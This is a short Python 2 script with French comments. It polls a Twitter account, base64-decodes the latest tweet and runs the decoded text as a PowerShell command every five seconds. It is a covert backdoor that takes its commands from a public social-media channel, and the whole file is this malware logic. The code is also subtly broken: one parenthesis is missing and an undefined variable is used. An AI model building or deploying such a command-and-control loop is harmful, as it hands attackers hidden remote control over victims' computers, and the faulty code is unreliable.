#imports
from bs4 import BeautifulSoup as bs
import os,subprocess,urllib,base64,time
#variables
oldText = str(" ")
text = str("l")
while True :
    html = urllib.urlopen('<url twitter accout>')
    soup = bs(html,"html.parser")
    tweets = soup.findAll('p',{"class":'TweetTextSize TweetTextSize--normal js-tweet-text tweet-text'}
    #recupere seulement le premier tweet lors de la premiere iteration de la boucle
    for cuicui in tweets:
        text = str(cuicui.find('p',{"class":'TweetTextSize TweetTextSize--normal js-tweet-text tweet-text'}).get_text())
        break
    #si le dernier tweet n'est pas different que lors du dernier passage de la boucle, pause et continue
    if text != oldText:
        dec = base64.b64decode(text)
        print dec
        subprocess.call(["C:\\WINDOWS\\system32\\WindowsPowerShell\\v1.0\\powershell.exe", dec],shell = True, stdout = subprocess.PIPE, stderr = subprocess.PIPE, stdin = subprocess.PIPE)
        print shell.stdout.read() + shell.stderr.read()
        oldText = text
    time.sleep(5)
    continue
